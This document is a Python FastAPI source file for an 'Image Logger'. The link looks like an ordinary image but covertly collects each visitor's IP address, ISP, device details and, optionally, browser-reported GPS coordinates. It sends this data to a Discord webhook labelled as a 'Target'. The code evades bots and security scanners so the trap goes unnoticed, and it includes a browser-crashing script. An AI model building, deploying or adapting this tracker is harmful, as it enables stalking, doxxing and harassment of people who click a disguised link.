import os
import sys
import base64
import logging
import ipaddress
from typing import Optional, Dict, Any
from urllib import parse

from fastapi import FastAPI, Request, HTTPException, Response
from fastapi.responses import HTMLResponse, RedirectResponse
import requests
import httpagentparser
from pydantic import BaseModel, ValidationError, validator
import uvicorn

# --- Configuration ---

class ConfigSettings(BaseModel):
    webhook_url: str
    default_image: str
    username: str = "Image Logger"
    embed_color: int = 0x00FFFF
    crash_browser: bool = False
    accurate_location: bool = False
    vpn_check_level: int = 1
    link_alerts: bool = True
    bugged_image: bool = True
    anti_bot_level: int = 1
    redirect_url: Optional[str] = None
    custom_message: Optional[str] = None
    blacklisted_ips: tuple = ("ip1, ip2, ip3, ip4") # Set your blacklisted IPs here
    # --- Validation    ---

    @validator('webhook_url')
    def validate_webhook(cls, v):
        if not v.startswith("https://discord.com/api/webhooks/") or "discord" not in v:
            raise ValueError("Invalid Discord Webhook URL")
        return v

    @validator('default_image')
    def validate_image_url(cls, v):
        if not v.startswith("http"):
            raise ValueError("Default image must be a valid HTTP/HTTPS URL")
        return v

# --- Load Configuration ---
try:
    WEBHOOK_URL = os.getenv("DISCORD_WEBHOOK_URL")
    if not WEBHOOK_URL:
        raise ValueError("DISCORD_WEBHOOK_URL environment variable is missing")
    
    config = ConfigSettings(
        webhook_url=WEBHOOK_URL,
        default_image=os.getenv("DEFAULT_IMAGE"),
        username=os.getenv("BOT_USERNAME", "Image Logger"),
        crash_browser=os.getenv("CRASH_BROWSER", "false").lower() == "true",
        accurate_location=os.getenv("ACCURATE_LOCATION", "false").lower() == "true",
        vpn_check_level=int(os.getenv("VPN_CHECK_LEVEL", "1")),
        link_alerts=os.getenv("LINK_ALERTS", "true").lower() == "true",
        bugged_image=os.getenv("BUGGED_IMAGE", "true").lower() == "true",
        anti_bot_level=int(os.getenv("ANTI_BOT_LEVEL", "1")),
        redirect_url=os.getenv("REDIRECT_URL"),
        custom_message=os.getenv("CUSTOM_MESSAGE"),
    )
except ValidationError as e:
    print(f"Configuration Error: {e}")
    sys.exit(1)
except Exception as e:
    print(f"Critical Error: {e}")
    sys.exit(1)

# --- Logging Setup ---
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger("ImageLogger")

# --- Security & Utilities ---

class SecurityUtils:
    @staticmethod
    def is_private_ip(ip: str) -> bool:
        try:
            ip_obj = ipaddress.ip_address(ip)
            return ip_obj.is_private or ip_obj.is_loopback or ip_obj.is_reserved
        except ValueError:
            return True  # Treat invalid IPs as private/blocked

    @staticmethod
    def validate_url(url: str) -> bool:
        try:
            parsed = parse.urlparse(url)
            if parsed.scheme not in ['http', 'https']:
                return False
            if SecurityUtils.is_private_ip(parsed.hostname):
                return False
            return True
        except:
            return False

    @staticmethod
    def get_client_ip(request: Request) -> str:
        forwarded = request.headers.get("X-Forwarded-For")
        if forwarded:
            return forwarded.split(',')[0].strip()
        return request.client.host if request.client else "0.0.0.0"

class RateLimiter:
    def __init__(self, max_requests: int, window_seconds: int):
        self.requests: Dict[str, list] = {}
        self.max_requests = max_requests
        self.window_seconds = window_seconds

    def is_allowed(self, ip: str) -> bool:
        import time
        current_time = time.time()
        if ip not in self.requests:
            self.requests[ip] = []
        
        self.requests[ip] = [t for t in self.requests[ip] if current_time - t < self.window_seconds]
        
        if len(self.requests[ip]) >= self.max_requests:
            return False
        
        self.requests[ip].append(current_time)
        return True

# --- Rate Limiter ---
rate_limiter = RateLimiter(max_requests=5, window_seconds=60)

# --- Constants ---
LOADING_IMAGE = base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR91000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')

def bot_check(ip: str, useragent: str) -> Optional[str]:
    if not useragent:
        return "Suspicious (No UA)"
    ua_lower = useragent.lower()
    if any(x in ua_lower for x in ['bot', 'crawler', 'spider', 'slack', 'telegram']):
        return "Detected Bot"
    if ip.startswith(("34", "35")):
        return "Cloud Provider IP"
    return None

def send_webhook(payload: dict):
    try:
        requests.post(config.webhook_url, json=payload, timeout=5)
    except Exception as e:
        logger.error(f"Failed to send webhook: {e}")

def log_ip_data(ip: str, useragent: str, coords: Optional[str] = None):
    if SecurityUtils.is_private_ip(ip):
        return None
    
    if not rate_limiter.is_allowed(ip):
        logger.warning(f"Rate limit exceeded for {ip}")
        return None

    bot_type = bot_check(ip, useragent)
    if bot_type:
        if config.link_alerts:
            send_webhook({
                "username": config.username,
                "content": "",
                "embeds": [{
                    "title": "🚨 Link Sent Alert",
                    "color": 0xFF0000,
                    "description": f"Bot/Scanner detected.\nIP: `{ip}`\nType: `{bot_type}`"
                }]
            })
        return None

    # Geolocation
    geo_info = {}
    try:
        resp = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857", timeout=5)
        if resp.status_code == 200:
            geo_info = resp.json()
    except Exception as e:
        logger.error(f"Geolocation failed: {e}")

    # Checks
    is_proxy = geo_info.get("proxy", False)
    is_hosting = geo_info.get("hosting", False)

    if is_proxy and config.vpn_check_level == 2:
        return None
    
    ping_role = ""
    if is_proxy and config.vpn_check_level == 1:
        ping_role = ""
    elif not is_proxy:
        ping_role = "@everyone"

    if is_hosting:
        if config.anti_bot_level in [2, 4]:
            return None
        if config.anti_bot_level in [1, 3]:
            ping_role = ""

    # Build Embed
    os_info, browser_info = "Unknown", "Unknown"
    if useragent:
        try:
            os_info, browser_info = httpagentparser.simple_detect(useragent)
        except:
            pass

    embed = {
        "title": "🔓 IP Logged Successfully",
        "color": config.embed_color,
        "description": f"**Target:** `{ip}`\n**Location:** {geo_info.get('city', 'Unknown'), {geo_info.get('country', 'Unknown')}}\n**ISP:** {geo_info.get('isp', 'Unknown')}\n**Device:** {os_info} - {browser_info}",
        "fields": [
            {"name": "Coordinates", "value": coords if coords else "Not Available", "inline": False},
            {"name": "User Agent", "value": f"```{useragent[:1000]}```" if useragent else "Not Available", "inline": False}
        ]
    }

    send_webhook({
        "username": config.username,
        "content": ping_role,
        "embeds": [embed]
    })
    return geo_info

# --- Application ---

app = FastAPI(title="Image Logger", docs_url=None, redoc_url=None)

@app.get("/", response_class=HTMLResponse)
async def handle_request(request: Request, url: Optional[str] = None, id: Optional[str] = None, g: Optional[str] = None):
    client_ip = SecurityUtils.get_client_ip(request)
    useragent = request.headers.get("user-agent", "")
    
    logger.info(f"Request from {client_ip}")

    # Determine Image
    target_image = config.default_image
    if url or id:
        try:
            encoded = url or id
            decoded = base64.b64decode(encoded).decode('utf-8')
            if SecurityUtils.validate_url(decoded):
                target_image = decoded
        except:
            pass

    # Bot Check for Serving Content
    if bot_check(client_ip, useragent) or client_ip.startswith(config.blacklisted_ips):
        if config.bugged_image:
            return Response(content=LOADING_IMAGE, media_type="image/jpeg")
        elif SecurityUtils.validate_url(target_image):
            return RedirectResponse(url=target_image)
        else:
            raise HTTPException(status_code=400, detail="Invalid image configuration")

    # Log Data
    coords = None
    if g and config.accurate_location:
        try:
            coords = base64.b64decode(g).decode('utf-8')
        except:
            pass
    
    log_ip_data(client_ip, useragent, coords)

    # Response Logic
    if config.redirect_url and SecurityUtils.validate_url(config.redirect_url):
        return RedirectResponse(url=config.redirect_url)

    if config.crash_browser:
        crash_script = "<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>"
        content = (config.custom_message or "") + crash_script
        return HTMLResponse(content=content)

    if config.custom_message:
        return HTMLResponse(content=config.custom_message)

    # Default: Serve Image
    safe_url = parse.quote(target_image, safe='/:')
    html_content = f"""
    <!DOCTYPE html>
    <html>
    <head>
        <title>Image</title>
        <style>body {{ margin: 0; background: #000; display: flex; justify-content: center; align-items: center; height: 100vh; }} img {{ max-width: 100%; max-height: 100%; }}</style>
    </head>
    <body>
        <img src="{safe_url}" onerror="window.location='{safe_url}'">
    </body>
    </html>
    """
    
    if config.accurate_location and not g:
        html_content += """
        <script>
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(function(e) {
                var t = e.coords.latitude + "," + e.coords.longitude;
                var n = btoa(t).replace(/=/g, "%3D");
                window.location.replace(window.location.href + (window.location.href.includes("?") ? "&" : "?") + "g=" + n);
            }, function() {}, {enableHighAccuracy: false, timeout: 5000, maximumAge: 0});
        }
        </script>
        """

    return HTMLResponse(content=html_content)

if __name__ == "__main__":
    logger.info("Starting Image Logger (FastAPI)")
    uvicorn.run(app, host="0.0.0.0", port=8000)